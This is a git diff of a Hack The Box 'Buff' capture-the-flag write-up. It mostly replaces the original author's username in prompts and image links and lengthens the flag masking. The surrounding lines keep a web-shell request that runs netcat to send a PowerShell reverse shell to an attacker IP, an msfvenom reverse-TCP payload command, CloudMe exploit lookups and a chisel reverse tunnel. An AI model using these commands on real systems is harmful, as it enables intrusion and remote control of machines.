@@ -9,6 +9,7 @@ avatar: assets/htb/buff.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Buff
 ---
+
 ## Overview
 
 TODO: finish writeup, clean up. - I wish I had taken better notes on this one, but I finished it during a pretty busy time.
@@ -44,7 +45,7 @@ I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regular
 At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
 
 ```text
-zweilos@kali:~/htb/buff$ nmap -p- -sC -sV --reason -oN buff.nmap -Pn <YOUR_IP>
+kac0@kali:~/htb/buff$ nmap -p- -sC -sV --reason -oN buff.nmap -Pn <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 10:13 EDT
 Nmap scan report for <YOUR_IP>
 Host is up, received user-set (0.10s latency).
@@ -66,15 +67,15 @@ Only found two open ports: 7680 which nmap reported \(with low confidence\) as `
 
 ### Port 8080 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-buffgym.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-buffgym.png)
 
 Some kind of fitness site
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-about.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-about.png)
 
 "mrbe3n's Bro Hut" - on about page
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-undefined-index.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-undefined-index.png)
 
 I found an `upload.php` page, but it gave an error message.  I wasn't sure what `xampp` was, so I looked it up.
 
@@ -84,7 +85,7 @@ I found an `upload.php` page, but it gave an error message.  I wasn't sure what 
 
 ###  Exploiting Gym Management Software 1.0
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-gym-management.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-gym-management.png)
 
 Gym Management Software 1.0 - contact page
 
@@ -123,7 +124,7 @@ Gym Management Software 1.0 - contact page
 The exploit instructions looked more complicated than they actually were.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/buff]
+┌──(kac0㉿kali)-[~/htb/buff]
 └─$ python3 ./buff-exploit.py 'http://<YOUR_IP>:8080/'                                           1 ⨯
             /\
 /vvvvvvvvvvvv \--------------------------------------,                                                  
@@ -179,7 +180,7 @@ This time I used Burp to send the command to download `nc.exe` to the remote mac
 ```text
 http://<YOUR_IP>:8080//upload/kamehameha.php?telepathy=nc.exe%20-e%20powershell.exe%2010.10.15.82%2012346
 
-┌──(zweilos㉿kali)-[~/htb/buff]
+┌──(kac0㉿kali)-[~/htb/buff]
 └─$ nc -lvnp 12346                                                                                  1 ⨯
 listening on [any] 12346 ...
 connect to [10.10.15.82] from (UNKNOWN) [<YOUR_IP>] 51161
@@ -324,7 +325,7 @@ Mode                LastWriteTime         Length Name
 
 PS C:\Users\shaun\desktop> cat user.txt
 cat user.txt
-c414****cdc3
+c414************************cdc3
 ```
 
 Got the user flag from `shaun`'s desktop!
@@ -635,7 +636,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 ps showed multiple versions of `CloudMe` running.  
 
 ```text
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ searchsploit cloudme
 ---------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                        |  Path
@@ -657,7 +658,7 @@ Shellcodes: No Results
 I had to test multiple of the exploits before I found one that actually worked. I'm certain that it was more the fact that this was an easy box that was being hammered by many many people. Even after choosing the right exploit I had to reset the machine to get it to run. I also had to recompile some of the shellcode in the exploit with the provided `msfvenom` command. 
 
 ```text
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.220 LPORT=12345 -f c                                       
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -717,7 +718,7 @@ http://<YOUR_IP>:8080/upload/kamehameha.php?telepathy=nc.exe -e powershell.exe 1
 Had to manually upload both nc.exe and chisel.exe...used burp repeater
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/buff]
+┌──(kac0㉿kali)-[~/htb/buff]
 └─$ chisel server -p 8099 --reverse                                        
 2020/08/23 18:27:12 server: Reverse tunnelling enabled
 2020/08/23 18:27:12 server: Fingerprint 4c:09:ee:d3:88:28:01:8e:ef:aa:e3:36:db:ef:a1:80
@@ -730,7 +731,7 @@ R:8000:127.0.0.1:7890
 ### Getting a shell
 
 ```text
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ nc -lvnp 12345                                                                                  1 ⨯
 listening on [any] 12345 ...
 connect to [10.10.18.82] from (UNKNOWN) [<YOUR_IP>] 49702
@@ -808,5 +809,5 @@ and then I was logged in as Administrator, with full privileges!
 ```text
 c:\Users\Administrator\Desktop>type root.txt
 type root.txt
-b7f7****081b
+b7f7************************081b
 ```
